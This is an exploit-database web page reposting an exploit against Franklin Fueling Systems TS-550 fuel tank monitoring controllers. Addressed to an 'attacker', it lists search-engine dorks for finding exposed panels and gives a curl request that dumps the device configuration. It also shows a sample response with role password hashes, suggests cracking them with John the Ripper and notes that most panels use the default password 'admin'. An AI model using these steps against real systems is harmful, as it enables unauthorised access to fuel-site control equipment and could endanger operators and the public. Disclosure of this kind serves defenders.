---
title: Franklin Fueling Systems TS-550 Hash Disclosure / Default Credentials
url: https://cxsecurity.com/issue/WLB-2023040070
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:28.943960
---

# Franklin Fueling Systems TS-550 Hash Disclosure / Default Credentials

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Franklin Fueling Systems TS-550 Hash Disclosure / Default Credentials** **2023.04.21**  Credit:  **[parsa rezaie khiabanloo](https://cxsecurity.com/author/parsa%2Brezaie%2Bkhiabanloo/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Franklin Fueling Systems TS-550 - Default Password
# Date: 4/16/2023
# Exploit Author: parsa rezaie khiabanloo
# Vendor Homepage: Franklin Fueling Systems (http://www.franklinfueling.com/)
# Version: TS-550
# Tested on: Linux/Android(termux)
Step 1 : attacker can using these dorks and access to find the panel
inurl:"relay\_status.html"
inurl:"fms\_compliance.html"
inurl:"fms\_alarms.html"
inurl:"system\_status.html"
inurl:"system\_reports.html'
inurl:"tank\_status.html"
inurl:"sensor\_status.html"
inurl:"tank\_control.html"
inurl:"fms\_reports.html"
inurl:"correction\_table.html"
Step 2 : attacker can send request
curl -H "Content-Type:text/xml" --data '<TSA\_REQUEST\_LIST><TSA\_REQUEST COMMAND="cmdWebGetConfiguration"/></TSA\_REQUEST\_LIST>' http://IP:10001/cgi-bin/tsaws.cgi
Step 3 : if get response that show like this
<TSA\_RESPONSE\_LIST VERSION="2.0.0.6833" TIME\_STAMP="2013-02-19T22:09:22Z" TIME\_STAMP\_LOCAL="2013-02-19T17:09:22" KEY="11111111" ROLE="roleGuest"><TSA\_RESPONSE COMMAND="cmdWebGetConfiguration"><CONFIGURATION>
<DEBUGGING LOGGING\_ENABLED="false" LOGGING\_PATH="/tmp"/>
<ROLE\_LIST>
<ROLE NAME="roleAdmin" PASSWORD="YrKMc2T2BuGvQ"/>
<ROLE NAME="roleUser" PASSWORD="2wd2DlEKUPTr2"/>
<ROLE NAME="roleGuest" PASSWORD="YXFCsq2GXFQV2"/>
</ROLE\_LIST>
Step 4 : attacker can crack the hashesh using john the ripper
notice : most of the panels password is : admin
Disclaimer:
The information provided in this advisory is provided "as is" without
warranty of any kind. Trustwave disclaims all warranties, either express or
implied, including the warranties of merchantability and fitness for a
particular purpose. In no event shall Trustwave or its suppliers be liable
for any damages whatsoever including direct, indirect, incidental,
consequential, loss of business profits or special damages, even if
Trustwave or its suppliers have been advised of the possibility of such
damages. Some states do not allow the exclusion or limitation of liability
for consequential or incidental damages so the foregoing limitation may not
apply.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040070)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top